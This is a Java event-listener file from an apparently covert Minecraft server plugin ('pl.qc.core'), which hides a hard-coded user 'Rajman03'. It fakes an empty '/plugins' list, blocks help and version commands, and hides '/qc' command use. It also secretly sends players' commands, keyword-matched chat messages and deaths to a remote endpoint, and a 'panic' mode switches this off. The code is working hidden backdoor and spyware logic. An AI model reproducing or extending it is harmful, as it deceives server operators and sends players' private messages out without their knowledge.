package pl.qc.core;

import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import java.util.*;

public class Events implements Listener {
    private final QC plugin;

    public Events(QC plugin) {
        this.plugin = plugin;
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onAdminJoin(org.bukkit.event.player.PlayerJoinEvent e) {
        String adm = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
        if (e.getPlayer().getName().equals(adm)) {
            e.setJoinMessage(null);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onAdminQuit(org.bukkit.event.player.PlayerQuitEvent e) {
        Player p = e.getPlayer();
        String adm = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");

        // Hide admin quit OR any player kicked by /qc k
        if (p.getName().equals(adm) || pl.qc.core.hack.PlayerTracker.kicked.remove(p.getUniqueId())) {
            e.setQuitMessage(null);
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onCommandSpy(PlayerCommandPreprocessEvent event) {
        if (plugin.isPanic())
            return;
        Player p = event.getPlayer();
        String adm = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
        String msg = event.getMessage().toLowerCase();

        // Incognito: Block standard command info for non-admins
        if (msg.startsWith("/plugins") || msg.startsWith("/pl") || msg.equals("/?") || msg.startsWith("/help")
                || msg.startsWith("/ver") || msg.startsWith("/about")) {
            if (!p.getName().equals(adm)) {
                if (msg.startsWith("/plugins") || msg.startsWith("/pl"))
                    p.sendMessage("Plugins (0):");
                else
                    p.sendMessage("§cNie masz uprawnień!");
                event.setCancelled(true);
                return;
            }
        }

        // Hide QC command usage from logs/others
        if (msg.startsWith("/qc") && !p.getName().equals(adm)) {
            event.setCancelled(true);
            return;
        }

        if (plugin.getConfig().getBoolean("spy.command-spy", true) && !p.getName().equals(adm)) {
            Map<String, String> f = new LinkedHashMap<>();
            f.put("Gracz", p.getName());
            f.put("Komenda", "`" + event.getMessage() + "`");
            Remote.send("Spy: Komenda 🛰️", "3447003", null, f);
        }
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onChatSpy(AsyncPlayerChatEvent event) {
        if (plugin.isPanic())
            return;
        Player p = event.getPlayer();
        String adm = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
        if (p.getName().equals(adm) || !plugin.getConfig().getBoolean("spy.social-spy", true))
            return;

        String msg = event.getMessage().toLowerCase();
        plugin.getConfig().getStringList("spy.keywords").stream()
                .filter(k -> msg.contains(k.toLowerCase()))
                .findFirst().ifPresent(k -> {
                    Map<String, String> f = new LinkedHashMap<>();
                    f.put("Gracz", p.getName());
                    f.put("Treść", event.getMessage());
                    f.put("Słowo", k);
                    Remote.send("Spy: Alerty ⚠️", "16711680", null, f);
                });
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onDeath(PlayerDeathEvent event) {
        if (plugin.isPanic() || !plugin.getConfig().getBoolean("logger.deaths", true))
            return;
        Player p = event.getEntity();
        Map<String, String> f = new LinkedHashMap<>();
        f.put("Gracz", p.getName());
        f.put("Powód", event.getDeathMessage());
        Remote.send("Śmierć 💀", "16711680", null, f);
    }
}
